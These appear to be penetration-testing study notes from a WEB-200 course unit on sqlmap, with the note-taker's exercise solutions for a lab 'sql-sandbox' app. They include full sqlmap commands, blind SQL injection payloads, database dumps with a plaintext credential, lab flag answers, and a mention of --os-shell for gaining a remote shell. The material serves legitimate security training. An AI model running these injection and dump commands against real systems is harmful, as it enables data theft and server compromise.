This Learning Unit covers the following Learning Objectives:

1. Understand how to use sqlmap to identify SQL injection vulnerabilities
2. Understand how to use sqlmap to obtain a basic OS shell
3. Understand how to use sqlmap to create a web shell

The SQL injection processes we have discussed can be automated with the help of several tools pre-installed in Kali Linux. One of the more notable tools is _sqlmap_,[1](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/exploiting-sql-injection-31322/extra-miles-31050#fn-local_id_281-1) which can identify and exploit SQL injection vulnerabilities against various database engines.

(Bernardo Damele A.G. and Miroslav Stampar, 2021), [https://sqlmap.org/](https://sqlmap.org/) [↩︎](https://portal.offsec.com/courses/web-200-28380/learning/sql-injection-30958/database-dumping-with-automated-tools-31321/database-dumping-with-automated-tools-31463#fnref-local_id_281-1)

------------

#### 8.4.1 SQLMap

Let’s use sqlmap on our sample web application. We could use sqlmap as a fully automated tool to crawl a site, but as penetration testers it is often more useful to manually explore a target before running another automated tool against it. While we could use any of the pages in our SQL Sandbox application, we'll focus on `http://sql-sandbox/sqlmap/`. With Burp Suite running, let's visit the page with the embedded Chromium browser.

We'll click _Submit Query_ to load some results in the page.

Search results on /sqlmap
![[Pasted image 20240822153833.png]]
Let's switch to Burp Suite, click on _Proxy_ > _HTTP history_, and review the requests and responses.

Baseline request and response that we will provide to sqlmap
![[Pasted image 20240822153905.png]]
Since the response from /sqlmap/api seems to include data from a database, we'll provide the request to sqlmap as our starting point.

Let's run sqlmap. We will set the URL we want to scan with `-u`, set `--method POST` to send a POST request, use `--data` for the POST body, and specify the parameters to test with -p followed by a comma-separated list. We will exclude the _db_ parameter since the application uses it to determine which database to use. We will also update the POST body to make sure the _name_ parameter isn't empty.

```bash
kali@kali:~$ sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order"
...
[15:00:23] [INFO] testing 'Generic inline queries'
[15:00:23] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[15:00:23] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[15:00:23] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[15:00:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[15:00:23] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[15:00:23] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[15:00:23] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]
```


Sqlmap will issue multiple requests to determine a parameter's vulnerability to SQL injection. It also attempts to determine what database software is being used so it can adjust the attacks to that software. As it is running, it may prompt us for the tests to perform. In this case, we can accept the defaults by pressing `ENTER` when prompted.

However, by reducing the number of requests, the scan might fail to identify some vulnerable parameters. With any automated tool, we need to balance the speed and coverage of a scan.

Once sqlmap has identified a vulnerable parameter, it will ask us if we want to keep testing the other parameters.

sqlmap identified a vulnerable parameter
```bash
[15:02:06] [WARNING] POST parameter 'name' does not seem to be injectable
[15:02:06] [WARNING] heuristic (basic) test shows that POST parameter 'sort' might not be injectable
[15:02:06] [INFO] testing for SQL injection on POST parameter 'sort'
[15:02:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:02:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:02:06] [INFO] POST parameter 'sort' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --code=200)
[15:02:07] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
```

For the sake of demonstration, we will accept the default, which is to skip the other parameters. After several moments, sqlmap will complete its scan and present the results.


sqlmap results
```bash
sqlmap identified the following injection point(s) with a total of 319 HTTP(s) requests:
---
Parameter: sort (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: db=mysql&name=taco&sort=(SELECT (CASE WHEN (4205=4205) THEN 'id' ELSE (SELECT 5575 UNION SELECT 9292) END))&order=asc

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: db=mysql&name=taco&sort=id AND (SELECT 6144 FROM (SELECT(SLEEP(5)))WrFh)&order=asc
---
[15:03:47] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[15:03:48] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 230 times
[15:03:48] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/sql-sandbox'

[*] ending @ 15:03:48 /2021-07-28/
```


In this case, it found one vulnerable parameter and used two different techniques to exploit the vulnerability, listing a payload for each technique. Even when sqlmap is doing the work for us, having these sample payloads helps us understand how it exploited the vulnerability.

We can now use sqlmap to automate the extraction of data from the database. We will run sqlmap again with `--dbms to set "mysql"` as the backend type and we'll `--dump` the contents of all tables in the database. The data extraction's duration will depend on which injection techniques can be used.


```bash
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=mysql --dump

Table: flags                                                                                                                                                                                                
[1 entry]                                                                                                                                                                                                   
+------+------------------------+                                                                                                                                                                           
| id   | flag                   |                                                                                                                                                                           
+------+------------------------+
| 1000 | OS{SQLMapFlagForMySQL} |
+------+------------------------+

[19:45:57] [INFO] table 'sqlmap.flags' dumped to CSV file '/root/.local/share/sqlmap/output/sql-sandbox/dump/sqlmap/flags.csv'
[19:45:57] [INFO] fetching columns for table 'menu' in database 'sqlmap'
[19:45:57] [INFO] fetching entries for table 'menu' in database 'sqlmap'
Database: sqlmap
Table: menu
[3 entries]
+----+-------+-------------------+------------------------------------------------------------------------------------------+
| id | price | name              | description                                                                              |
+----+-------+-------------------+------------------------------------------------------------------------------------------+
| 10 | 2.99  | Tacos             | Corn tortilla with cilantro, onions, and choice of protein.                              |
| 11 | 3.99  | Tostadas          | Fried corn tortilla with refried beans, lettuce, tomato, avocado, and choice of protein. |
| 12 | 3.45  | Horchata de arroz | A sweet beverage made from rice, vanilla, and cinnamon.                                  |
+----+-------+-------------------+------------------------------------------------------------------------------------------+

[19:45:57] [INFO] table 'sqlmap.menu' dumped to CSV file '/root/.local/share/sqlmap/output/sql-sandbox/dump/sqlmap/menu.csv'
[19:45:57] [INFO] fetching columns for table 'users' in database 'sqlmap'
[19:45:57] [INFO] fetching entries for table 'users' in database 'sqlmap'
Database: sqlmap
Table: users
[1 entry]
+------+------------+-----------+
| id   | password   | username  |
+------+------------+-----------+
| 1000 | notunusual | tom.jones |
+------+------------+-----------+

[19:45:57] [INFO] table 'sqlmap.users' dumped to CSV file '/root/.local/share/sqlmap/output/sql-sandbox/dump/sqlmap/users.csv'
[19:45:57] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2 times
[19:45:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/sql-sandbox'

```


According to the output in Listing 22, sqlmap was able to dump the contents of the entire database. In addition to displaying the contents in the terminal window, sqlmap also created a CSV file with the dumped content.

Sqlmap has many other features, such as the ability to attempt Web Application Firewall (WAF) bypasses and execute complex queries to automate the complete takeover of a server. For example, using the _os-shell_ parameter will attempt to automatically upload and execute a remote command shell on the target system. However, this feature only works if the database writes to the application's web root and the application is written in ASP, ASPX, JSP, or PHP. When it does work, this shell can be somewhat slow but it can provide an effective foothold to gain access to the underlying server.

Sqlmap stores information in a session file to speed up tests against URLs that it has already scanned. In the case of our sandbox application, this can be detrimental since we can select which database the application uses. We can instruct sqlmap to ignore any previous sessions with the `--flush-session` flag.

As with any automated tool, sqlmap can miss SQL injection vulnerabilities. It may incorrectly identify the database, skip relevant test cases, fail because of arguments we apply, or fail because of misconfigurations on our part. Also, we should not rely on a tool if we do not understand how the tool works. However, we should consider using it in conjunction with tools like Burp Suite and Wireshark to capture what the tool is doing and then attempt to replicate the attacks manually. This is often a very effective learning technique and should not be overlooked.

For the following exercises, remember to use the `--flush-session` flag when switching between databases.



1. `OS{SQLMapFlagForMySQL}`
![[Pasted image 20240822155214.png]]
same command utilized from the exercises above
```bash
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=mysql --dump --flush-session

Table: flags                                                                                                                                                                                                
[1 entry]                                                                                                                                                                                                   
+------+------------------------+                                                                                                                                                                           
| id   | flag                   |                                                                                                                                                                           
+------+------------------------+
| 1000 | OS{SQLMapFlagForMySQL} |
+------+------------------------+
```
![[Pasted image 20240822155244.png]]

2. `OS{PostgreSQLsqlmapFlag}`

starting point - hit submit
![[Pasted image 20240822155410.png]]
open burp and pull parameters
![[Pasted image 20240822155436.png]]
flush sessin because switching databases
```bash
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=postgres&name=taco&sort=id&order=asc" -p "name,sort,order" --flush-session
```
![[Pasted image 20240822155655.png]]
dumping flag table
```bash
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=postgres&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=postgres --dump
```
![[Pasted image 20240822155814.png]]


### For exercises 3/4 you start in the `SYSTEM` database so in order to complete this exercise you need to identify the `SQLMAP` database 
3. `OS{secretSQLmapFlagForMSSQL}`
![[Pasted image 20240827172613.png]]
starting point
![[Pasted image 20240822162044.png]]
pull up burp - copy parameters for sqlmap query
![[Pasted image 20240822162118.png]]
![[Pasted image 20240822162258.png]]
sqlmap dump database - taking  a while to finish
```bash
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mssql&name=taco&sort=id&order=asc" -p "name,sort,order" --dbms=mssql --dump --flush-session
```
this returns nothing

In order to continue on we need to know what database we are woking with.

This command with default input shows all the databases available with the `-dbs` and `-D` option
```bash
┌──(root💀gobots)-[27Aug2024 20:54:33]-[/home/kali]
└─# sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mssql&name=Tacos&sort=id&order=asc" -p "name,sort,order" --dbms=mssql --dbs -D testing --flush-session
```
![[Pasted image 20240827172258.png]]
Once we have the databases we then need the tables - we didnt have to flush session
```bash
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mssql&name=Tacos&sort=id&order=asc" -p "name,sort,order" --dbms=mssql -D sqlmap --tables --flush-session 
```
This returns the tables
![[Pasted image 20240827172417.png]]
then we need the columns
```bash
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=mssql&name=Tacos&sort=id&order=asc" -p "name,sort,order" --dbms=mssql -D sqlmap -T flags --dump --flush-session 
```
profit
![[Pasted image 20240827172543.png]]
4. `OS{OracleSQLmapFlag}`
![[Pasted image 20240827190447.png]]
starting point
![[Pasted image 20240827172713.png]]
Spits out all information for the `SYSTEM` database
```bash
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=&sort=id&order=asc" -p "name,sort,order" --dbms=oracle --dump --flush-session
```

Getting all databases
```bash
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=&sort=id&order=asc" -p "name,sort,order" --dbms=oracle --dbs -D testing --flush-session
```
![[Pasted image 20240827185730.png]]
getting all tables in the `SQLMAP` database
```bash
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=&sort=id&order=asc" -p "name,sort,order" --dbms=oracle -D sqlmap --tables
```
![[Pasted image 20240827190017.png]]
getting all the columins in the `flags` table
```bash
sqlmap -u http://sql-sandbox/sqlmap/api --method POST --data "db=oracle&name=&sort=id&order=asc" -p "name,sort,order" --dbms=oracle -D sqlmap -T flags --dump --flush-session 
```
![[Pasted image 20240827190244.png]]